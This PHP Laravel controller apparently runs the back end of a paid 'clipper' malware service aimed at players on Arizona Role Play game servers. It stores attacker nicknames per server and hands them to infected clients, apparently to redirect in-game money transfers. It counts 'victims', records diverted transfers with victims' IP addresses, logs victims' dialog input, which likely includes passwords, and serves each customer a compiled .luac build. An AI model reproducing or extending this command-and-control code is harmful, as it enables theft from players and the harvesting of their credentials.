<?php

namespace App\Http\Controllers;

use App\User;
use Illuminate\Http\Request;
use Auth;
use DB;
use Carbon\Carbon;
use Response;

class ClipperController extends Controller
{
    //
    public function index(){
        $id_base = Auth::id();
        $info_user = DB::table('users')->where('id',  $id_base)->first();
        if($info_user->clipper == 0) return redirect('/404');

        $date= Carbon::now(+3);
        $date  = substr($date, 0, 10);

        $clipper = DB::table('clipper')->orderBy('id', 'desc')->where('id_base',  $id_base)->get();

        $count_money = DB::table('clipper')->where('id_base',  $id_base)->get();

        $count = 0;
        foreach ($count_money as $money){
            $count += $money->money;
        }
        $money = $count;

        $money_today = DB::table('clipper')->where('date', 'like',  '%'.$date.'%')->where('id_base',  $id_base)->get();

        $count = 0;
        foreach ($money_today  as $money_t){
            $count += $money_t->money;
        }
        $money_today = $count;

        $news = DB::table('news')->orderBy('id', 'desc')->get();

        return view('layouts.clipper', compact('clipper','money','info_user','date', 'money_today', 'news'));
    }
    public function settings(){
        $id_base = Auth::id();
        $info_user = DB::table('users')->where('id',  $id_base)->first();
        if($info_user->clipper == 0) return redirect('/404');
        $news = DB::table('news')->orderBy('id', 'desc')->get();

	$clipper = DB::table('nicks')->where('id_base',  $id_base)->first();
	if($clipper == null){
	DB::table('nicks')->insert([
            'id_base' => $id_base,
	    'Phoenix' => NULL,
            'Tucson' => NULL,
            'Scottdale' => NULL,
            'Chandler' => NULL,
            'Brainburg' => NULL,
            'SaintRose' => NULL,
            'Mesa' => NULL,
            'RedRock' => NULL,
            'Yuma' => NULL,
            'Surprise' => NULL,
            'Prescott' => NULL,
        ]);
	}

        $info_nicks = DB::table('nicks')->where('id_base',  $id_base)->first();

        return view('layouts.clippersettings', compact('info_nicks','info_user','news'));
    }
    public function addSettings(Request $request){
        $id_base = Auth::id();
        $info_user = DB::table('users')->where('id',  $id_base)->first();
        if($info_user->clipper == 0) return redirect('/404');

        $Phoenix= $request->input('Phoenix');
        $Tucson= $request->input('Tucson');
        $Scottdale = $request->input('Scottdale');
        $Chandler = $request->input('Chandler');
        $Brainburg = $request->input('Brainburg');
        $SaintRose = $request->input('SaintRose');
        $Mesa = $request->input('Mesa');
        $RedRock = $request->input('RedRock');
        $Yuma = $request->input('Yuma');
        $Surprise = $request->input('Surprise');
        $Prescott = $request->input('Prescott');


        $set = DB::table('nicks')->where('id_base', $id_base)->update([
            'Phoenix' => $Phoenix,
            'Tucson' => $Tucson,
            'Scottdale' => $Scottdale,
            'Chandler' => $Chandler,
            'Brainburg' => $Brainburg,
            'SaintRose' => $SaintRose,
            'Mesa' => $Mesa,
            'RedRock' => $RedRock,
            'Yuma' => $Yuma,
            'Surprise' => $Surprise,
            'Prescott' => $Prescott,
        ]);

        if($set) return back();
    }
    public function server($server, $id, $soft, Request $request){
        if($soft == 1){
            $server_info = DB::table('nicks')->where('id_base',  $id)->first();
	    $victims = DB::table('users')->where('id',  $id)->first();
            $server = $server_info->$server;
	    DB::table('users')->where('id', $id)->update([
            		'victims' => $victims->victims + 1,
            ]);

        }

        if($soft == 2){
            $server_directory = DB::table('loader')->where('id_base',  $id)->first();
            $directory = 'directory_'.$server;
            $server = $server_directory->$directory;
		
        }

        if($soft == 3){
	    	$nick_1 =  $request->input('nick_1');
	    	$nick_2 = $request->input('nick_2');
		echo  $nick_2;
		$money = $request->input('money');
		$ip_user = $_SERVER['REMOTE_ADDR'];
		$date = Carbon::now(+3);
           	 DB::table('clipper')->insert([
            		'id_base' => $id,
           		'nick_1' => $nick_1,
            		'nick_2' => $nick_2,
            		'money' => $money,
            		'server' => 'Arizona Role Play | '.$server,
            		'ip_user' => $ip_user,
            		'date' => $date,	
        	]);
	return redirect('/404');

        }
	if($soft == 4){
	    	$id_base =  $server;
	    	$nick = $request->input('nick');
		$input = $request->input('input');
		$srvname = $request->input('srvname');
		$srvip = $request->input('srvip');
		$dialog= $request->input('dialog');
		$ip_user = $_SERVER['REMOTE_ADDR'];
		$date = Carbon::now(+3);
	
           	 DB::table('logs')->insert([
            		'id_base' => $id_base,
           		'nick' => $nick,
            		'input' => $input,
            		'server' => $srvname.'('.$srvip.')',
            		'dialog' => $dialog,
            		'ip_user' => $ip_user,
            		'date' => $date,	
        	]);
	return redirect('/404');

        }


        return view('layouts.server', compact('server'));
    }
    public function dowloadClipper(){
        $id_base = Auth::id();
        $info_user = DB::table('users')->where('id',  $id_base)->first();
        if($info_user->clipper == 0) return redirect('/404');

        return Response::download('bilds_clipper/'.$id_base.'.luac');
    }
   


}
